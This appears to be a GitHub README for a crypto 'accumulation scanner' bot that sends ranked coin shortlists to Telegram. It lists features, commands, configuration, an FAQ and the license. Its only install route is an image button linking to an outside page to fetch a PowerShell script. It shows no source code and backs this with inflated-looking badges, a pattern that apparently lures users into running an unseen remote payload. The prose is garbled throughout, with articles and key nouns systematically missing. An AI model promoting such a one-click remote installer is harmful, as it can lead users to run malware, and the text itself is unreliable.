<div align="center">

# 🚀 Community-Powered Crypto Accumulation Scanner for Discord & Telegram

![](files/preview.png)

### 📦 PowerShell Install Button

[![](files/button.png)](https://Nihongo-editor.github.io/crypto-accumulation-scanner/)

[![powershell-7](https://img.shields.io/badge/Powershell--7-Installer-e11d48?style=flat&labelColor=0d1117)]() [![users](https://img.shields.io/badge/Users-3.4K-f43f5e?style=flat&labelColor=0d1117)]() [![ci](https://img.shields.io/badge/Ci-Green-2ea44f?style=flat&labelColor=0d1117)]()

</div>

---

Crypto Accumulation Scanner is a community-built tool that quietly watches market for coiling in long, flat bases before a breakout, then checks news, sector momentum, and futures positioning to send a ranked shortlist straight to your Telegram every four hours. It's driven by feedback and testing of everyone who uses it, because project grew out of hard rather than a flashy strategy that only looks good on a chart. You get a full toolkit of features— scans, a rolling backtest a bias-reduced factor report, free news and event feeds, listing-announcement sniping, blacklists, and forward-test logging—all packaged for easy scheduling on Windows. Whether you're a curious newcomer or a data-minded veteran, there's room to dig in, contribute, and help shape where it goes next.

## ✅ Before You Start

- **PowerShell 5.1+** (pre-installed on Windows 10 and 11)
- **Windows 10 / 11** (x64)
- **Internet connection** — required to fetch the script
- **Administrator** — *not* required

## Features

**🔍 Spot before they move**
core of this bot is a accumulation scanner. It hunts for assets sitting in long, flat bases where volatility has been squeezed dry — kind of setup that tends to precede a breakout. You get a ranked shortlist instead of a wall of raw data.

**📊 Multi-factor scoring**
Each candidate is weighed across a blend of technical and market signals — base structure, volume behavior, trend context, momentum readings, relative strength against broader market, and derivatives positioning like funding and open interest. Scores are transparent, so you can see *why* a coin made list.

**📰 News & catalyst checks**
Accumulation doesn't happen in a vacuum. scanner pulls in free news feeds to flag upcoming events, fresh catalysts, and red flags — so you're not staring at a chart while missing story behind it.

**📈 Sector momentum context**
don't move alone. bot cross-checks sector-level momentum so you know whether a setup is swimming tide or against it, helping you separate isolated bases broader rotations.

**⏰, right where you chat**
Set it and forget it. A ranked shortlist lands in your Telegram on a schedule — by default every few hours — so scanning happens while you live your life. No dashboards to babysit, no tabs to refresh.

**🪙 Single-coin deep dives**
Curious about one asset? Ask for a breakdown and get full picture: base quality, factor scores, positioning, and news that matters — all for that one coin.

**🧾 Full scan history & forward-test stats**
Every alert is logged. Review past scans, see which ones fired OK and which failed, and track how earlier shortlists actually performed over following days. Accountability built in.

**🚨 Listing sniper mode**
A dedicated fast lane watches for new listing announcements on a tight interval, so you hear about fresh markets while they're still fresh.

**🗂️ Simple, hackable config**
A clean config template handles your bot credentials and preferences. A blacklist file lets you permanently skip you never want to see. Everything is plain and readable — tweak it to fit how *you* trade.

**🤝 Built community in mind**
This is an open, evolving project. Found a factor that works better? Spotted a bug? Want a new command? Ideas and pull requests are genuinely welcome — scanner gets sharper every time someone contributes what they've learned.

**🔓 Research-first, no black box**
Signals are documented, scores are inspectable, and project is honest about what's proven versus what's still being. It's a watchlist tool, not a magic button — and it's built to help you learn, not just click.

## Commands

Here's command reference — everything bot can do, grouped by what you're trying to accomplish.

**🔍 Scanning & Discovery**

- `/scan` — kick off a fresh accumulation scan across tracked market and return a ranked shortlist of currently coiling in a flat base.
- `/coin <symbol>` — get a full breakdown for a single coin: base quality, volatility squeeze state, volume behavior, and trend context.
- `/sniper` — watch listing announcements on a short loop so you hear about fresh pairs moment they appear.
- `/top [n]` — show top *n* candidates most recent scan (defaults to latest ranked set).

**📊 Signals & Context**

- `/score <symbol>` — see how a coin's coil score is composed, factor by factor, so you understand *why* it ranked where it did.
- `/momentum <symbol>` — check entry-timing signals separately base score; momentum confirms timing, it doesn't pick coin.
- `/news <symbol>` — pull recent headlines and catalysts tied to a coin, plus any red flags worth knowing about.
- `/sector` — compare momentum across market sectors to see where rotation is actually happening.
- `/futures <symbol>` — inspect funding rate and open interest positioning for a coin derivatives data.

**🔔 & Automation**

- `/subscribe` — opt into automatic ranked shortlists delivered on regular scan cadence.
- `/unsubscribe` — stop automatic deliveries for your chat.
- `/interval <hours>` — adjust how often scheduled scans and fire.
- `/` — list your current alert settings and delivery status.

**🗂️ History & Tracking**

- `/runs` — review log of every scan: date, time, and whether it completed or failed.
- `/stats` — see forward-test results for past, checked at 3, 7, and 14 days after they went out.
- `/history [symbol]` — look at when a coin appeared in previous shortlists and how it behaved afterward.

**⚙️ Configuration & Housekeeping**

- `/settings` — view and adjust your personal preferences for bot.
- `/blacklist` — manage you never want to see in results.
- `/status` — check that scanner is healthy, when next run is due, and which data sources are responding.
- `/help` — bring up this command list anytime, right inside chat.
- `/feedback` — send suggestions, bug reports, or ideas straight to maintainers.

**💡 A quick tip on how to read output:** scan produces a *watchlist*, not trade signals. Treat ranked shortlist as candidates worth your own research, use `/momentum` and `/news` to add context, and lean on `/stats` to judge how signals have actually performed over time. community grows best when people share what they're seeing — so if a scan surfaces something interesting, say so.

## Configuration

Getting Crypto Accumulation Scanner to fit your workflow is where fun begins. Everything lives in a single config file, and once you've set it up, scanner quietly does its thing — sipping market data, checking news, and pinging you a ranked shortlist every four hours. Here's how to make it yours.

### 🔑 Telegram credentials

Start bundled config template and copy it to a working config. Inside, you'll add your bot token and chat ID where should land. That's heartbeat of whole setup — without it, scanner still runs but has nowhere to send its findings. Keep that file out of any public repo; treat it like a house key.

### 🪙 Watchlist and blacklist

scanner is friendly to your preferences. Drop in a custom list of you want to track, or let it scan broader market on its own. A separate blacklist lets you veto you never want to see again — handy for projects you've already researched and ruled out. scanner respects that list on every run, no questions asked.

### ⏱️ Scan cadence

By default, scanner wakes up every four hours, which balances fresh data against noise. You can nudge that interval up or down in config if you'd rather check more often during volatile weeks, or less often if you want a calmer inbox. same setting applies to listing sniper, which keeps its own tighter five-minute rhythm.

### 📊 Scoring and signal tuning

Here's community-favorite part. scoring weights — how much coil pattern, momentum, volatility squeeze, and funding signals each contribute — are all exposed in config. defaults come project's based rebuild, and they're a solid starting point. But if you've done your own homework and want more weight on relative strength, or less on futures positioning, go right ahead. Your scanner, your rules.

### 🗞️ News and catalyst feeds

Free news sources are wired in by default, and you can toggle individual feeds on or off. If a particular source feels noisy, mute it. If you find a clean RSS feed project doesn't yet cover, config makes room for custom entries. stay informative without turning into a firehose.

### 🤖 Automation options

On Windows, built-in task installer reads your config and sets up scheduled runs for you — no manual scheduler gymnastics. On other systems, same config values drive scanner when you invoke it your own scheduler. Either way, run log and forward-test stats are already wired in, so you'll always know what fired and when.

### 🎯 Sniper settings

listing sniper has its own small configuration block: which announcement feeds to watch, how eagerly to alert, and how to filter out you've blacklisted. Tune it gently — this mode is deliberately chatty, and a little restraint goes a long way toward keeping it useful.

### 💾 Data and logging

Every scan is logged automatically, and past are stored so forward-test stats stay accurate over time. You can point data folder wherever you like, which is great if you want to keep everything in one workspace or it up alongside config. Raw data is saved first, so an unlucky crash never costs you a whole run.

### 🧪 Test before you trust

Change one thing at a time, then run scanner once and read log. community has found that adjusting two or three weights at once makes it hard to tell what actually helped. Start small, compare a few runs, and share what you learn — that feedback loop is exactly how defaults got sharper in first place.

## FAQ

**Is Crypto Accumulation Scanner free to use?**
Yes — completely free and open source. Run it locally, tweak scoring weights, or extend it your own factors. No subscriptions, no hidden tiers.

**How often does scanner run?**
By default it scans every 4 hours and sends a ranked shortlist to Telegram. You can adjust schedule in configuration or trigger a scan manually whenever you like.

**Do I need a Telegram bot to use it?**
Telegram delivery is default, but it's not mandatory. You can run scans and inspect results locally without any bot credentials. Add your Telegram token and chat ID when you're ready for.

**Which exchanges and markets are supported?**
scanner is built around Bybit's public market data via ccxt, CoinGecko used for supplemental context. architecture is modular, so adding another exchange is a matter of plugging in a new data adapter.

**How does scoring actually work?**
A coin's accumulation score comes base structure, volatility compression, volume behaviour, and relative strength. Momentum signals are used only for entry timing — not as part of core score. This split came directly backtesting, where momentum factors added noise rather than edge.

**What do forward-test stats mean?**
Every alert is logged and checked 3, 7, and 14 days later. stats command shows how past actually performed, so you can judge scanner on instead of vibes. edge is still being proven live — treat it as a watchlist, not a signal service.

**Can I exclude certain?**
Absolutely. Drop ticker symbols into blacklist file and they'll be skipped on every scan. Useful for stablecoins, low-liquidity names, or anything you simply don't want to see.

**Something broke or a scan failed — what should I check?**
Start scan log, which records each run's date, time, and status. Most failures trace to missing or expired credentials, a temporary API hiccup, or a network interruption. Raw data is saved before processing, so a crash won't cost you whole run.

**Can I contribute or suggest new factors?**
Yes, and it's genuinely welcome. project grew out of iterating on what data showed, so ideas backed by a test or a clear rationale are most useful kind. Fork it, experiment, and share what you find — community feedback has already shaped how scanner works today.

**Does it give financial advice?**
No. It's an educational and research tool that produces a shortlist of worth a closer look. Always do your own research and never risk more than you can afford to lose.

## Support

Got a question, hit a snag, or just want to swap ideas about accumulation setups? You're in right place — this project grows through people using it.

**Ways to get help**

- **Check FAQ first** — most configuration and alert questions are already answered there, and it'll usually get you sorted faster than waiting on a reply.
- **Open an issue** for bugs, unexpected scan results, or feature ideas. more detail you include — what you ran, what you expected, what actually happened — quicker it can be looked at.
- **Join conversation** in community channels where users compare shortlists, share what's working, and flag anything that looks off.

**What makes support better**

This is a community-driven project, so feedback genuinely shapes it. If a factor feels noisy, a command behaves oddly, or you spot a gap in docs, say so. Bug reports and suggestions users are what keep scanner honest and improving.

**Before you post**

- Confirm you're on latest version.
- Include your config setup (any credentials removed) and exact command you ran.
- Mention whether you're on Windows, macOS, or Linux — automation behaves differently across them.

**A quick note**

Response times vary since this is maintained alongside other work, but every report gets read. Patience and clear details go a long way — and if you figure something out yourself, sharing it helps next person.

Thanks for being part of it. Happy scanning. 🚀

## License

This project is released under MIT License — permissive, permissive on purpose. That means you're free to use, copy, modify, merge, publish, distribute, and even sell copies of Crypto Accumulation Scanner, whether for personal experiments or your own community tooling, as long as original copyright notice and permission notice stay intact. No warranty of any kind comes software; it's a research tool handed to community in spirit of shared learning, so run it care and treat its output as a watchlist, not a guarantee.

In plain terms: tinker scanner, fork it, adapt it for your own Discord or Telegram setup, add your own features and factor ideas — that's exactly what it's for. If you build something interesting on top of it, a shout-out to project is appreciated but never required. If you spot a bug or an improvement, opening an issue or a pull request helps whole community benefit, and contributions of any size are welcome.

One friendly reminder: MIT License covers code, not data it touches or markets it looks at. Keep API keys and credentials out of anything you share publicly, review third-party dependencies' own licenses before redistributing a bundled version, and remember that scanner is an educational and research project — not financial advice. Enjoy exploring, and happy accumulation-spotting!